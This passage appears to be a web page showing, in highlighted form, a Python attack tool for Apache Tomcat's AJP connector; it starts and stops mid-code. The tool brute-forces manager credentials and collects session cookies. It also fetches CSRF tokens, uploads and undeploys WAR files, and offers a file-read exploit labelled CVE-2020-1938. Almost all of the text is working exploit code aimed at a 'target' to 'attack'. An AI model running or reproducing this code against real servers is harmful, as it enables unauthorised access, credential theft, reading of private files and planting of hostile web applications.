self.forward_request.request_headers[<span class="string">&#x27;SC_REQ_AUTHORIZATION&#x27;</span>] = <span class="string">&quot;Basic &quot;</span> + creds</span><br><span class="line">		<span class="keyword">while</span> <span class="keyword">not</span> stop:</span><br><span class="line">			logger.debug(<span class="string">&quot;testing %s:%s&quot;</span> % (user, password))</span><br><span class="line">			responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">			snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line">			<span class="keyword">if</span> snd_hdrs_res.http_status_code == <span class="number">404</span>:</span><br><span class="line">				<span class="keyword">raise</span> NotFoundException(<span class="string">&quot;The req_uri %s does not exist!&quot;</span> % self.req_uri)</span><br><span class="line">			<span class="keyword">elif</span> snd_hdrs_res.http_status_code == <span class="number">302</span>:</span><br><span class="line">				self.req_uri = snd_hdrs_res.response_headers.get(<span class="string">&#x27;Location&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">				logger.info(<span class="string">&quot;Redirecting to %s&quot;</span> % self.req_uri)</span><br><span class="line">				self.forward_request.req_uri = self.req_uri</span><br><span class="line">			<span class="keyword">elif</span> snd_hdrs_res.http_status_code == <span class="number">200</span>:</span><br><span class="line">				logger.info(<span class="string">&quot;Found valid credz: %s:%s&quot;</span> % (user, password))</span><br><span class="line">				res = <span class="literal">True</span></span><br><span class="line">				stop = <span class="literal">True</span></span><br><span class="line">				<span class="keyword">if</span> <span class="string">&#x27;Set-Cookie&#x27;</span> <span class="keyword">in</span> snd_hdrs_res.response_headers:</span><br><span class="line">					logger.info(<span class="string">&quot;Here is your cookie: %s&quot;</span> % (snd_hdrs_res.response_headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>, <span class="string">&#x27;&#x27;</span>)))</span><br><span class="line">			<span class="keyword">elif</span> snd_hdrs_res.http_status_code == <span class="number">403</span>:</span><br><span class="line">				logger.info(<span class="string">&quot;Found valid credz: %s:%s but the user is not authorized to access this resource&quot;</span> % (user, password))</span><br><span class="line">				stop = <span class="literal">True</span></span><br><span class="line">			<span class="keyword">elif</span> snd_hdrs_res.http_status_code == <span class="number">401</span>:</span><br><span class="line">				stop = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">start_bruteforce</span>(<span class="params">self, users, passwords, req_uri, autostop</span>):</span><br><span class="line">		logger.info(<span class="string">&quot;Attacking a tomcat at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line">		self.req_uri = req_uri</span><br><span class="line">		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri)</span><br><span class="line"> 	 </span><br><span class="line">		f_users = <span class="built_in">open</span>(users, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">		f_passwords = <span class="built_in">open</span>(passwords, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"></span><br><span class="line">		valid_credz = []</span><br><span class="line">		<span class="keyword">try</span>:</span><br><span class="line">			<span class="keyword">for</span> user <span class="keyword">in</span> f_users:</span><br><span class="line">				f_passwords.seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">for</span> password <span class="keyword">in</span> f_passwords:</span><br><span class="line">					<span class="keyword">if</span> autostop <span class="keyword">and</span> <span class="built_in">len</span>(valid_credz) &gt; <span class="number">0</span>:</span><br><span class="line">						self.socket.close()</span><br><span class="line">						<span class="keyword">return</span> valid_credz</span><br><span class="line"></span><br><span class="line">					user = user.rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">					password = password.rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">					<span class="keyword">if</span> self.test_password(user, password):</span><br><span class="line">						valid_credz.append((user, password))</span><br><span class="line">		<span class="keyword">except</span> NotFoundException <span class="keyword">as</span> e:</span><br><span class="line">			logger.fatal(e.message)</span><br><span class="line">		<span class="keyword">finally</span>:</span><br><span class="line">			logger.debug(<span class="string">&quot;Closing socket...&quot;</span>)</span><br><span class="line">			self.socket.close()</span><br><span class="line">			<span class="keyword">return</span> valid_credz</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">perform_request</span>(<span class="params">self, req_uri, headers=&#123;&#125;, method=<span class="string">&#x27;GET&#x27;</span>, user=<span class="literal">None</span>, password=<span class="literal">None</span>, attributes=[]</span>):</span><br><span class="line">		self.req_uri = req_uri</span><br><span class="line">		self.forward_request = prepare_ajp_forward_request(self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))</span><br><span class="line">		logger.debug(<span class="string">&quot;Getting resource at ajp13://%s:%d%s&quot;</span> % (self.target_host, self.target_port, req_uri))</span><br><span class="line">		<span class="keyword">if</span> user <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> password <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">			creds = b64encode((<span class="string">&quot;%s:%s&quot;</span> % (user, password)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">			self.forward_request.request_headers[<span class="string">&#x27;SC_REQ_AUTHORIZATION&#x27;</span>] = <span class="string">&quot;Basic &quot;</span> + creds</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> h <span class="keyword">in</span> headers:</span><br><span class="line">			self.forward_request.request_headers[h] = headers[h]</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> a <span class="keyword">in</span> attributes:</span><br><span class="line">			self.forward_request.attributes.append(a)</span><br><span class="line"></span><br><span class="line">		responses = self.forward_request.send_and_receive(self.socket, self.stream)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(responses) == <span class="number">0</span>:</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">None</span>, <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">		snd_hdrs_res = responses[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">		data_res = responses[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(data_res) == <span class="number">0</span>:</span><br><span class="line">			logger.info(<span class="string">&quot;No data in response. Headers:\n %s&quot;</span> % pformat(<span class="built_in">vars</span>(snd_hdrs_res)))</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> snd_hdrs_res, data_res</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">upload</span>(<span class="params">self, filename, user, password, old_version, headers=&#123;&#125;</span>):</span><br><span class="line">		deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)</span><br><span class="line">		<span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f_input:</span><br><span class="line">			<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/request&quot;</span>, <span class="string">&quot;w+b&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">				s_form_header = <span class="string">&#x27;------WebKitFormBoundaryb2qpuwMoVtQJENti\r\nContent-Disposition: form-data; name=&quot;deployWar&quot;; filename=&quot;%s&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&#x27;</span> % os.path.basename(filename)</span><br><span class="line">				s_form_footer = <span class="string">&#x27;\r\n------WebKitFormBoundaryb2qpuwMoVtQJENti--\r\n&#x27;</span></span><br><span class="line">				f.write(s_form_header.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">				f.write(f_input.read())</span><br><span class="line">				f.write(s_form_footer.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">		data_len = os.path.getsize(<span class="string">&quot;/tmp/request&quot;</span>)</span><br><span class="line"></span><br><span class="line">		headers = &#123;</span><br><span class="line">				<span class="string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>: <span class="string">&quot;multipart/form-data; boundary=----WebKitFormBoundaryb2qpuwMoVtQJENti&quot;</span>,</span><br><span class="line">				<span class="string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>: <span class="string">&quot;%d&quot;</span> % data_len,</span><br><span class="line">				<span class="string">&quot;SC_REQ_REFERER&quot;</span>: <span class="string">&quot;http://%s/manager/html/&quot;</span> % (self.target_host),</span><br><span class="line">				<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://%s&quot;</span> % (self.target_host),</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> obj_cookie <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">			headers[<span class="string">&quot;SC_REQ_COOKIE&quot;</span>] = obj_cookie.group(<span class="string">&#x27;cookie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		attributes = [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;JK_LB_ACTIVATION&quot;</span>, <span class="string">&quot;ACT&quot;</span>)&#125;, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;AJP_REMOTE_PORT&quot;</span>, <span class="string">&quot;12345&quot;</span>)&#125;]</span><br><span class="line">		<span class="keyword">if</span> old_version == <span class="literal">False</span>:</span><br><span class="line">			attributes.append(&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;query_string&quot;</span>, <span class="string">&quot;value&quot;</span>: deploy_csrf_token&#125;)</span><br><span class="line">		old_apps = self.list_installed_applications(user, password, old_version)</span><br><span class="line">		r = self.perform_request(<span class="string">&quot;/manager/html/upload&quot;</span>, headers=headers, method=<span class="string">&quot;POST&quot;</span>, user=user, password=password, attributes=attributes)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/tmp/request&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">			br = AjpBodyRequest(f, data_len, AjpBodyRequest.SERVER_TO_CONTAINER)</span><br><span class="line">			br.send_and_receive(self.socket, self.stream)</span><br><span class="line"></span><br><span class="line">		r = AjpResponse.receive(self.stream)</span><br><span class="line">		<span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">			logger.error(<span class="string">&#x27;Upload failed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> r.prefix_code != AjpResponse.END_RESPONSE:</span><br><span class="line">			r = AjpResponse.receive(self.stream)</span><br><span class="line">		logger.debug(<span class="string">&#x27;Upload seems normal. Checking...&#x27;</span>)</span><br><span class="line">		new_apps = self.list_installed_applications(user, password, old_version)</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(new_apps) == <span class="built_in">len</span>(old_apps) + <span class="number">1</span>:</span><br><span class="line">			logger.info(<span class="string">&#x27;Upload success!&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			logger.error(<span class="string">&#x27;Upload failed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_error_page</span>(<span class="params">self</span>):</span><br><span class="line">		<span class="keyword">return</span> self.perform_request(<span class="string">&quot;/blablablablabla&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_version</span>(<span class="params">self</span>):</span><br><span class="line">		hdrs, data = self.get_error_page()</span><br><span class="line">		<span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">			s = re.findall(<span class="string">&#x27;(Apache Tomcat/[0-9\.]+)&#x27;</span>, d.data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(s) &gt; <span class="number">0</span>:</span><br><span class="line">				<span class="keyword">return</span> s[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">get_csrf_token</span>(<span class="params">self, user, password, old_version, headers=&#123;&#125;, query=[]</span>):</span><br><span class="line">		<span class="comment"># first we request the manager page to get the CSRF token</span></span><br><span class="line">		hdrs, rdata = self.perform_request(<span class="string">&quot;/manager/html&quot;</span>, headers=headers, user=user, password=password)</span><br><span class="line">		deploy_csrf_token = re.findall(<span class="string">&#x27;(org.apache.catalina.filters.CSRF_NONCE=[0-9A-F]*)&quot;&#x27;</span>, <span class="string">&quot;&quot;</span>.join([d.data.decode(<span class="string">&#x27;utf8&#x27;</span>) <span class="keyword">for</span> d <span class="keyword">in</span> rdata]))</span><br><span class="line">		<span class="keyword">if</span> old_version == <span class="literal">False</span>:</span><br><span class="line">			<span class="keyword">if</span> <span class="built_in">len</span>(deploy_csrf_token) == <span class="number">0</span>:</span><br><span class="line">				logger.critical(<span class="string">&quot;Failed to get CSRF token. Check the credentials&quot;</span>)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">			logger.debug(<span class="string">&#x27;CSRF token = %s&#x27;</span> % deploy_csrf_token[<span class="number">0</span>])</span><br><span class="line">		obj = re.<span class="keyword">match</span>(<span class="string">&quot;(?P&lt;cookie&gt;JSESSIONID=[0-9A-F]*); Path=/manager(/)?; HttpOnly&quot;</span>, hdrs.response_headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">		<span class="keyword">if</span> obj <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">			<span class="keyword">return</span> deploy_csrf_token[<span class="number">0</span>], obj</span><br><span class="line">		<span class="keyword">return</span> deploy_csrf_token[<span class="number">0</span>], <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">list_installed_applications</span>(<span class="params">self, user, password, old_version, headers=&#123;&#125;</span>):</span><br><span class="line">		deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)</span><br><span class="line">		headers = &#123;</span><br><span class="line">				<span class="string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">				<span class="string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">				<span class="string">&quot;SC_REQ_REFERER&quot;</span>: <span class="string">&quot;http://%s/manager/html/&quot;</span> % (self.target_host),</span><br><span class="line">				<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://%s&quot;</span> % (self.target_host),</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> obj_cookie <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">			headers[<span class="string">&quot;SC_REQ_COOKIE&quot;</span>] = obj_cookie.group(<span class="string">&#x27;cookie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		attributes = [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;JK_LB_ACTIVATION&quot;</span>, <span class="string">&quot;ACT&quot;</span>)&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;AJP_REMOTE_PORT&quot;</span>, <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.socket.getsockname()[<span class="number">1</span>]))&#125;]</span><br><span class="line">		<span class="keyword">if</span> old_version == <span class="literal">False</span>:</span><br><span class="line">			attributes.append(&#123;</span><br><span class="line">			<span class="string">&quot;name&quot;</span>: <span class="string">&quot;query_string&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;%s&quot;</span> % deploy_csrf_token&#125;)</span><br><span class="line">		hdrs, data = self.perform_request(<span class="string">&quot;/manager/html/&quot;</span>, headers=headers, method=<span class="string">&quot;GET&quot;</span>, user=user, password=password, attributes=attributes)</span><br><span class="line">		found = []</span><br><span class="line">		<span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">			im = re.findall(<span class="string">&#x27;&lt;small&gt;&lt;a href=&quot;([^&quot;;]*)&quot;&gt;&#x27;</span>, d.data.decode(<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">			<span class="keyword">for</span> app <span class="keyword">in</span> im:</span><br><span class="line">				found.append(unquote(app))</span><br><span class="line">		<span class="keyword">return</span> found</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">def</span> <span class="title function_">undeploy</span>(<span class="params">self, path, user, password, old_version, headers=&#123;&#125;</span>):</span><br><span class="line">		deploy_csrf_token, obj_cookie = self.get_csrf_token(user, password, old_version, headers)</span><br><span class="line">		path_app = <span class="string">&quot;path=%s&quot;</span> % path</span><br><span class="line">		headers = &#123;</span><br><span class="line">				<span class="string">&quot;SC_REQ_CONTENT_TYPE&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">				<span class="string">&quot;SC_REQ_CONTENT_LENGTH&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">				<span class="string">&quot;SC_REQ_REFERER&quot;</span>: <span class="string">&quot;http://%s/manager/html/&quot;</span> % (self.target_host),</span><br><span class="line">				<span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://%s&quot;</span> % (self.target_host),</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> obj_cookie <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">			headers[<span class="string">&quot;SC_REQ_COOKIE&quot;</span>] = obj_cookie.group(<span class="string">&#x27;cookie&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		attributes = [&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;JK_LB_ACTIVATION&quot;</span>, <span class="string">&quot;ACT&quot;</span>)&#125;,</span><br><span class="line">			&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;req_attribute&quot;</span>, <span class="string">&quot;value&quot;</span>: (<span class="string">&quot;AJP_REMOTE_PORT&quot;</span>, <span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(self.socket.getsockname()[<span class="number">1</span>]))&#125;]</span><br><span class="line">		<span class="keyword">if</span> old_version == <span class="literal">False</span>:</span><br><span class="line">			attributes.append(&#123;</span><br><span class="line">			<span class="string">&quot;name&quot;</span>: <span class="string">&quot;query_string&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;%s&amp;%s&quot;</span> % (path_app, deploy_csrf_token)&#125;)</span><br><span class="line">		r = self.perform_request(<span class="string">&quot;/manager/html/undeploy&quot;</span>, headers=headers, method=<span class="string">&quot;POST&quot;</span>, user=user, password=password, attributes=attributes)</span><br><span class="line">		r = AjpResponse.receive(self.stream)</span><br><span class="line">		<span class="keyword">if</span> r.prefix_code == AjpResponse.END_RESPONSE:</span><br><span class="line">			logger.error(<span class="string">&#x27;Undeploy failed&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># Check the successful message</span></span><br><span class="line">		found = <span class="literal">False</span></span><br><span class="line">		regex = <span class="string">r&#x27;&lt;small&gt;&lt;strong&gt;Message:&lt;\/strong&gt;&lt;\/small&gt;&amp;nbsp;&lt;\/td&gt;\s*&lt;td class=&quot;row-left&quot;&gt;&lt;pre&gt;(OK - .*&#x27;</span>+path+<span class="string">&#x27;)\s*&lt;\/pre&gt;&lt;\/td&gt;&#x27;</span></span><br><span class="line">		<span class="keyword">while</span> r.prefix_code != AjpResponse.END_RESPONSE:</span><br><span class="line">			r = AjpResponse.receive(self.stream)</span><br><span class="line">			<span class="keyword">if</span> r.prefix_code == <span class="number">3</span>:</span><br><span class="line">				f = re.findall(regex, r.data.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">				<span class="keyword">if</span> <span class="built_in">len</span>(f) &gt; <span class="number">0</span>:</span><br><span class="line">					found = <span class="literal">True</span></span><br><span class="line">		<span class="keyword">if</span> found:</span><br><span class="line">			logger.info(<span class="string">&#x27;Undeploy succeed&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			logger.error(<span class="string">&#x27;Undeploy failed&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	parser = argparse.ArgumentParser()</span><br><span class="line">	subparsers = parser.add_subparsers()</span><br><span class="line"></span><br><span class="line">	parser.add_argument(<span class="string">&quot;target&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Hostname or IP to attack&quot;</span>)</span><br><span class="line">	parser.add_argument(<span class="string">&quot;--port&quot;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">8009</span>, <span class="built_in">help</span>=<span class="string">&quot;AJP port to attack (default is 8009)&quot;</span>)</span><br><span class="line">	parser.add_argument(<span class="string">&#x27;-v&#x27;</span>, <span class="string">&#x27;--verbose&#x27;</span>, action=<span class="string">&#x27;count&#x27;</span>, default=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">	parser_bf = subparsers.add_parser(<span class="string">&#x27;bf&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Bruteforce Basic authentication&#x27;</span>)</span><br><span class="line">	parser_bf.set_defaults(which=<span class="string">&#x27;bf&#x27;</span>)</span><br><span class="line">	parser_bf.add_argument(<span class="string">&quot;req_uri&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;/manager/html&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Resource to attack&quot;</span>)</span><br><span class="line">	parser_bf.add_argument(<span class="string">&quot;-U&quot;</span>, <span class="string">&quot;--users&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Filename containing the usernames to test against the Tomcat manager AJP&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">	parser_bf.add_argument(<span class="string">&quot;-P&quot;</span>, <span class="string">&quot;--passwords&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Filename containing the passwords to test against the Tomcat manager AJP&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">	parser_bf.add_argument(<span class="string">&#x27;-s&#x27;</span>, <span class="string">&#x27;--stop&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>, <span class="built_in">help</span>=<span class="string">&quot;Stop when we find valid credz&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#	parser_req = subparsers.add_parser(&#x27;req&#x27;, help=&#x27;Request resource&#x27;)</span></span><br><span class="line"><span class="comment">#	parser_req.set_defaults(which=&#x27;req&#x27;)</span></span><br><span class="line"><span class="comment">#	parser_req.add_argument(&quot;-m&quot;, &quot;--method&quot;, type=str, default=&quot;GET&quot;, help=&quot;Request method (default=GET)&quot;, choices=AjpForwardRequest.REQUEST_METHODS.keys())</span></span><br><span class="line"></span><br><span class="line">	parser_upload = subparsers.add_parser(<span class="string">&#x27;upload&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Upload WAR&#x27;</span>)</span><br><span class="line">	parser_upload.set_defaults(which=<span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;filename&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;WAR file to upload&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--user&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Username&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Password&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;-H&quot;</span>, <span class="string">&quot;--headers&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=&#123;&#125;, <span class="built_in">help</span>=<span class="string">&quot;Custom headers&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;--old-version&quot;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>, <span class="built_in">help</span>=<span class="string">&quot;Old version of Tomcat that does not implement anti-CSRF token&quot;</span>)</span><br><span class="line"></span><br><span class="line">	parser_upload = subparsers.add_parser(<span class="string">&#x27;undeploy&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Undeploy WAR&#x27;</span>)</span><br><span class="line">	parser_upload.set_defaults(which=<span class="string">&#x27;undeploy&#x27;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;path&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Installed WAR path&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--user&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Username&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Password&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;-H&quot;</span>, <span class="string">&quot;--headers&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=&#123;&#125;, <span class="built_in">help</span>=<span class="string">&quot;Custom headers&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;--old-version&quot;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>, <span class="built_in">help</span>=<span class="string">&quot;Old version of Tomcat that does not implement anti-CSRF token&quot;</span>)</span><br><span class="line"></span><br><span class="line">	parser_version = subparsers.add_parser(<span class="string">&#x27;version&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Get version&#x27;</span>)</span><br><span class="line">	parser_version.set_defaults(which=<span class="string">&#x27;version&#x27;</span>)</span><br><span class="line">	parser_upload = subparsers.add_parser(<span class="string">&#x27;list&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;List installed applications&#x27;</span>)</span><br><span class="line">	parser_upload.set_defaults(which=<span class="string">&#x27;list&#x27;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;-u&quot;</span>, <span class="string">&quot;--user&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Username&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="literal">None</span>, <span class="built_in">help</span>=<span class="string">&quot;Password&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;-H&quot;</span>, <span class="string">&quot;--headers&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=&#123;&#125;, <span class="built_in">help</span>=<span class="string">&quot;Custom headers&quot;</span>)</span><br><span class="line">	parser_upload.add_argument(<span class="string">&quot;--old-version&quot;</span>, action=<span class="string">&#x27;store_true&#x27;</span>, default=<span class="literal">False</span>, <span class="built_in">help</span>=<span class="string">&quot;Old version of Tomcat that does not implement anti-CSRF token&quot;</span>)</span><br><span class="line"></span><br><span class="line">	read_file = subparsers.add_parser(<span class="string">&#x27;read_file&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Exploit CVE-2020-1938&#x27;</span>)</span><br><span class="line">	read_file.set_defaults(which=<span class="string">&#x27;read_file&#x27;</span>)</span><br><span class="line">	read_file.add_argument(<span class="string">&quot;file_path&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;File to read&quot;</span>)</span><br><span class="line">	read_file.add_argument(<span class="string">&quot;-w&quot;</span>, <span class="string">&quot;--webapp&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;webapp potential params: &#x27;manager&#x27;, &#x27;host-manager&#x27;, &#x27;ROOT&#x27; or &#x27;examples&#x27;&quot;</span>)</span><br><span class="line">	read_file.add_argument(<span class="string">&quot;-o&quot;</span>, <span class="string">&quot;--output&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Output file (for binary files)&quot;</span>)</span><br><span class="line"></span><br><span class="line">	args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> args.verbose == <span class="number">1</span>:</span><br><span class="line">		logger.setLevel(logging.INFO)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		logger.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">	bf = 